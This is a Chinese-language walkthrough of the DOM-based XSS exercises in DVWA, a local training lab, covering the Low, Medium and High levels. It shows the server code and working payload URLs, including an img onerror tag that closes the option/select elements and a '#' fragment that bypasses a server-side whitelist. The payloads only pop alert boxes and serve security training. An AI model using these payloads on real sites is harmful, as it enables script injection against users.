	**XSS(DOM):**使用DOM可以使程序和脚本能够动态访问和更新文档内容、结构及样式。在网站页面有许多元素，当页面达到浏览器时，浏览器会为页面创建一个document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。客户端的脚本程序可以通过DOM动态修改页面内容，从客户端获取DOM中的数据并在本地执行。


## 1、Low
**查看源码**
```php
<?php

# No protections, anything goes

?>
```

直接开干吧。

**实战**<br />直接在url中构造payload
```
http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=<script>alert("XMTX")</script>
```

成功弹窗<br />![image-20210416142238350.png](_img/assets/1655880301325-141cec2c-742a-4c00-882a-e1770bb838a5.png)


## 2、Medium
**查看源码**
```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];
    
    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}

?>
```

**函数说明**
```
stripos()
定义和用法
stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。

语法
stripos(string,find,start)
string	必需。规定被搜索的字符串。
find	必需。规定要查找的字符。
start	可选。规定开始搜索的位置。
```

通过代码我们可以看到对`<script`进行了检测，不过我们可以使用img 标签。

**实战**<br />构造payload
```
http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=<img src=1 onerror=alert("XMTX")>
```

可是没有任何弹窗。

查看前端代码<br />![image-20210416143433774.png](_img/assets/1655880321239-bc7a45a3-a1d6-444c-b3b4-52053bbe98bc.png)

可以看到是因为包含在`<option>`和`<select>`中我们将其闭合即可，构造payload:
```
127.0.0.1/dvwa/vulnerabilities/xss_d/?default=</option></select><img src=1 onerror=alert("XMTX")>
```
![image-20210416143527562.png](_img/assets/1655880327440-b0c07f60-f48c-4d62-836b-adda6801abe5.png)


## 3、High
**查看源码**
```php
Unknown Vulnerability Source
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {

    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}

?>
```

通过源码可以看到这里事采用了白名单的方式，在这里我们可以采用#来绕过服务器端的操作（此方法仅适用于DOM型）

#是一个浏览器指导字符，该字符后面的的数据不会被传到服务器后端，所以可以通过该符号来绕过后端代码的过滤

**实战**<br />构造payload：
```
http://127.0.0.1/dvwa/vulnerabilities/xss_d/?#default=<script>alert("XMTX")</script>
```
![image-20210416144000373.png](_img/assets/1655880341205-bc12a435-420d-4805-9606-073d18ea6fa7.png)


## 4、Impossible

查看源码
```php
<?php# Don't need to do anything, protction handled on the client side?>
```
这个就不说了。
